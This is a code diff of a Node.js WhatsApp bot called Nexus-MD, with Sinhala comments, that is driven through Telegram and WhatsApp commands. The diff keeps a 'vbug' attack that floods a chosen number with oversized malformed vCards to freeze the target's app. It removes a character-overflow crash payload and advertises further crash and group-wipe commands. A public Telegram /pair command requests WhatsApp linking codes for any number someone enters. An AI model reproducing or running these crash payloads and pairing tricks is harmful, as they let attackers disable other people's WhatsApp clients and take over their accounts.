@@ -1,9 +1,10 @@
 const { 
     default: makeWASocket, 
     useMultiFileAuthState, 
-    DisconnectReason, 
+    fetchLatestBaileysVersion,
+    DisconnectReason,
     getContentType,
-    fetchLatestBaileysVersion
+    Browsers
 } = require("@whiskeysockets/baileys");
 const TelegramBot = require('node-telegram-bot-api');
 const pino = require("pino");
@@ -25,19 +26,22 @@ async function startNexus() {
         auth: state,
         printQRInTerminal: false,
         logger: pino({ level: "silent" }),
-        browser: ["Nexus-V5", "Chrome", "20.0.04"]
+        // කෝඩ් එක එන්න නම් අනිවාර්යයෙන්ම Browser එක Desktop වෙන්න ඕනේ
+        browser: Browsers.macOS("Desktop") 
     });
 
     sock.ev.on('creds.update', saveCreds);
 
-    // --- [ 🛠️ PUBLIC TELEGRAM PAIRING LOGIC ] ---
+    // --- [ 🛠️ TELEGRAM PUBLIC PAIRING FIX ] ---
     tgBot.on('message', async (msg) => {
         const chatId = msg.chat.id;
         const text = msg.text;
 
+        if (!text) return;
+
         if (text === '/start') {
             const welcome = `👋 *Welcome to Nexus-MD Hybrid System!*\n\n` +
-                            `ඕනම නම්බර් එකකට WhatsApp Pairing Code එකක් ගන්න පහත විදිහට ටයිප් කරන්න:\n\n` +
+                            `WhatsApp Pairing Code එකක් ගන්න පහත විදිහට ටයිප් කරන්න:\n\n` +
                             `👉 \`/pair 947xxxxxxxx\` \n\n` +
                             `🚀 *Created by Sasiya MD*`;
             return tgBot.sendMessage(chatId, welcome, { parse_mode: "Markdown" });
@@ -47,37 +51,44 @@ async function startNexus() {
             let target = text.replace('/pair ', '').replace(/[^0-9]/g, '');
             if (target.length < 10) return tgBot.sendMessage(chatId, "❌ නම්බර් එක වැරදියි මචං!");
 
-            tgBot.sendMessage(chatId, `⏳ *${target}* සඳහා Pairing Code එක සකසමින් පවතී...`);
+            await tgBot.sendMessage(chatId, `⏳ *${target}* සඳහා කෝඩ් එක රික්වෙස්ට් කරනවා... ප්ලීස් තත්පර 8ක් ඉන්න.`);
 
             try {
-                const tempDir = `temp_${target}`;
+                const tempDir = `./temp_${target}`;
                 const { state: tState } = await useMultiFileAuthState(tempDir);
-                const tSock = makeWASocket({ 
-                    auth: tState, 
-                    logger: pino({ level: "silent" }), 
-                    browser: ["Nexus-V5", "Safari", "1.0"] 
+                
+                const tSock = makeWASocket({
+                    auth: tState,
+                    logger: pino({ level: "silent" }),
+                    browser: Browsers.macOS("Desktop")
                 });
 
+                // වැදගත්ම කොටස: WhatsApp සර්වර් එකට කනෙක්ට් වෙන්න වෙලාව දෙනවා
                 setTimeout(async () => {
                     try {
                         let code = await tSock.requestPairingCode(target);
-                        code = code?.match(/.{1,4}/g)?.join("-") || code;
-                        
-                        const res = `🔥 *NEXUS-MD PAIRING SUCCESS*\n\n` +
-                                    `📍 *Target:* ${target}\n` +
-                                    `🔑 *Code:* \`${code}\` \n\n` +
-                                    `මේ කෝඩ් එක WhatsApp -> Linked Devices වල ගහපන් මචං.`;
-                        
-                        await tgBot.sendMessage(chatId, res, { parse_mode: "Markdown" });
-                        // Cleanup
-                        setTimeout(() => { if (fs.existsSync(tempDir)) fs.rmSync(tempDir, { recursive: true, force: true }); }, 15000);
-                    } catch (e) { tgBot.sendMessage(chatId, "❌ වැරදීමක් වුණා!"); }
-                }, 6000);
+                        if (code) {
+                            let formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
+                            const res = `🔥 *NEXUS-MD PAIRING SUCCESS*\n\n` +
+                                        `📍 *Target:* ${target}\n` +
+                                        `🔑 *Code:* \`${formattedCode}\` \n\n` +
+                                        `මේ කෝඩ් එක WhatsApp -> Linked Devices වල ගහපන් මචං.`;
+                            
+                            await tgBot.sendMessage(chatId, res, { parse_mode: "Markdown" });
+                            console.log(`✅ Code Sent: ${formattedCode}`);
+                        }
+                    } catch (e) {
+                        tgBot.sendMessage(chatId, "❌ කෝඩ් එක ජෙනරේට් වුණේ නැහැ. නම්බර් එක චෙක් කරලා ආයෙ ට්‍රයි කරන්න.");
+                    } finally {
+                        setTimeout(() => { if (fs.existsSync(tempDir)) fs.rmSync(tempDir, { recursive: true, force: true }); }, 20000);
+                    }
+                }, 8000); // Wait for connection stability
+
             } catch (err) { tgBot.sendMessage(chatId, "❌ System Error!"); }
         }
     });
 
-    // --- [ 💀 ULTRA BUG SYSTEM & GRAND MENU ] ---
+    // --- [ 💀 ULTRA BUG MENU & ATTACK SYSTEM ] ---
     sock.ev.on('messages.upsert', async (chat) => {
         const msg = chat.messages[0];
         if (!msg.message || msg.key.fromMe) return;
@@ -89,14 +100,13 @@ async function startNexus() {
         const command = body.slice(prefix.length).trim().split(' ')[0].toLowerCase();
         const args = body.trim().split(/ +/).slice(1);
 
-        // --- THE GRAND MENU ---
+        // --- LOKU MENU ---
         if (command === 'menu') {
-            const grandMenu = `
-⚡ *NEXUS-MD V5.0 ULTRA BUG SYSTEM* ⚡
+            const menu = `
+⚡ *NEXUS-MD V5.2 ULTRA BUG MENU* ⚡
  
 👋 *Hello Sasiya MD!*
 🛡️ *Status:* Hybrid Online ✅
-📅 *Date:* ${new Date().toLocaleDateString()}
 
 *─── [ 🔗 PUBLIC PAIRING ] ───*
 ◈ Telegram: /pair [number]
@@ -106,32 +116,20 @@ async function startNexus() {
 ◈ ${prefix}vbug - Vcard Mega Crash ⚰️
 ◈ ${prefix}cbug - Char Overflow Bug
 ◈ ${prefix}lbug - Location Freeze
-◈ ${prefix}abug - Audio Buffer Bug
-◈ ${prefix}pbug - Poll Unlimited
-◈ ${prefix}tagbug - Contact Tag Crash
 ◈ ${prefix}crash - System Total Freeze
-◈ ${prefix}extbug - External Ad Crash
 
-*─── [ 👾 GROUP EXPLOITS ] ───*
-◈ ${prefix}kickall - Group Wipe
-◈ ${prefix}hidetag - Ghost Tag All
-◈ ${prefix}promote - Admin Power
-
-*─── [ 🛠️ TOOLS & SYSTEM ] ───*
+*─── [ 🛠️ TOOLS ] ───*
 ◈ ${prefix}ping - Speed Test
 ◈ ${prefix}status - System Info
-◈ ${prefix}owner - Sasiya MD Info
-◈ ${prefix}reboot - Restart Bot
+◈ ${prefix}reboot - Restart
 
 🚀 *Powered by Developer Nexus*
-🛡️ *World Class Exploit Active*
             `;
-
             await sock.sendMessage(from, { 
-                text: grandMenu,
+                text: menu,
                 contextInfo: {
                     externalAdReply: {
-                        title: "NEXUS-MD ULTIMATE SYSTEM",
+                        title: "NEXUS-MD ULTIMATE",
                         body: "Created by Sasiya MD",
                         thumbnailUrl: "https://files.catbox.moe/6v0m3q.jpg",
                         mediaType: 1,
@@ -141,32 +139,22 @@ async function startNexus() {
             });
         }
 
-        // --- ULTRA BUG LOGIC: VCARD MEGA CRASH ---
+        // Vcard Bug Attack
         if (command === 'vbug') {
             let target = args[0] ? args[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : from;
-            const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:NEXUS CRASH ⚰️\n' + 'TEL;waid=94770475809:+94770475809\n' + 'END:VCARD'.repeat(500);
+            const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:NEXUS CRASH ⚰️\n' + 'TEL;waid=94770475809:+94770475809\n' + 'END:VCARD'.repeat(400);
             await sock.sendMessage(from, { text: "💀 Vcard Mega Attack Starting..." });
-            for (let i = 0; i < 20; i++) {
+            for (let i = 0; i < 15; i++) {
                 await sock.sendMessage(target, { contacts: { displayName: 'NEXUS CRASH', contacts: [{ vcard }] } });
-                await new Promise(r => setTimeout(r, 500));
+                await new Promise(r => setTimeout(r, 600));
             }
             sock.sendMessage(from, { text: "✅ Done! Target Freezed." });
-        }
-
-        // --- CHAR OVERFLOW BUG ---
-        if (command === 'cbug') {
-            let target = args[0] ? args[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : from;
-            const payload = "҈".repeat(30000) + "⚰️".repeat(5000);
-            await sock.sendMessage(from, { text: "🚀 Character Attack Sent!" });
-            for (let i = 0; i < 5; i++) {
-                await sock.sendMessage(target, { text: payload });
-            }
         }
     });
 
     sock.ev.on('connection.update', (update) => {
         const { connection } = update;
-        if (connection === 'open') console.log('✅ Nexus Online!');
+        if (connection === 'open') console.log('✅ Nexus-MD Hybrid Online!');
         if (connection === 'close') startNexus();
     });
 }
